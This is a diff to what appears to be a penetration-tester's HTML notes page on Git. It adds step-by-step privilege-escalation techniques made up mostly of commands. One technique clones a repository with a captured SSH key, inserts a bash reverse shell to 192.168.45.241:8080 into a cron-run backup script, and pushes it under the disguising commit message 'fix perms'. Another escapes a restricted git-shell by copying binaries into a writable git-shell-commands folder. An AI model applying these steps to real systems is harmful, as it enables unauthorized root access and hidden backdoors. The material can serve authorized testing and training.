@@ -26,6 +26,39 @@
             <p>Always recomended to check the version of the application with <b>git --version</b> in order to identify related vulnerabilities</p>
             <h2>Exploitation</h2>
             <ul>
+                <h3>Privilege escalation - Git crontab</h3>
+                <ul>
+                    <p>In case you already have a shell inside the machine and found there is a <b>git</b> user which you have also access too it is recommended to check for existing repositoris</p>
+                    <p>We can use the following command to search it but you are likely to find it by using manual enumeration</p>
+                    <pre><code class="language-bash">find / -user git -type d 2>/dev/null</code></pre>
+                    <p>Now clone the repo to your kali machine. In this case we are using the id_rsa of the github user</p>
+                    <pre><code class="language-bash">GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@192.168.205.125:/git-server</code></pre>
+                    <p>Looking at the files we found there is a backup.sh which is a bash script the we could modify and add our custom code.</p>
+                    <pre><code class="language-bash">#!/bin/bash
+bash -i >& /dev/tcp/192.168.45.241/8080 0>&1</code></pre>
+                    <p>In order to perform a commit and the push we need to setup the git identity</p>
+                    <pre><code class="language-bash">git config --global user.name "kali"
+git config --global user.email "kali@kali.(none)"</code></pre>
+                    <p>Now add the modified file to the staging area</p>
+                    <pre><code class="language-bash">git add -A </code></pre>
+                    <p>Now add execute permissions to the script</p>    
+                    <pre><code class="language-bash">git update-index --chmod=+x backups.sh</code></pre>
+                    <p>Create a commit</p>
+                    <pre><code class="language-bash">git commit -m "fix perms"</code></pre>
+                    <p>Push the changes to the remote repository</p>
+                    <pre><code class="language-bash">GIT_SSH_COMMAND='ssh -i ../gitid_rsa -p 43022' git push origin master</code></pre>
+                </ul>
+                
+                <h3>Privilege escalation - git-shell</h3>
+                <ul>
+                    <p>In case you already have a shell inside the machine and found there is a <b>git</b> user which you have also access too attempt to log in as that user</p>
+                    <p>If you see something like the following and every time you type a command it says not found</p>
+                    <pre><code class="language-bash">git> </code></pre>
+                    <p>It means you are in a restricted environment. Attempt to look for a folder called <b>git-shell-commands</b> and check if you are able to write in it</p>
+                    <p>We can attemp to write a simple command like <b>ls</b> and then log again and check if we can use it</p>
+                    <pre><code class="language-bash">cp /usr/bin/ls /git-shell-commands/ls</code></pre>
+                </ul>
+
                 <h3>Privilege escalation - CVE-2023-23946</h3>
                 <ul>
                     <p>In case we already have a shell inside the machine and found a git version prior to <b>2.39.2, 2.38.4, 2.37.6, 2.36.5, 2.35.7, 2.34.7, 2.33.7, 2.32.6, 2.31.7, and 2.30.8</b></p>
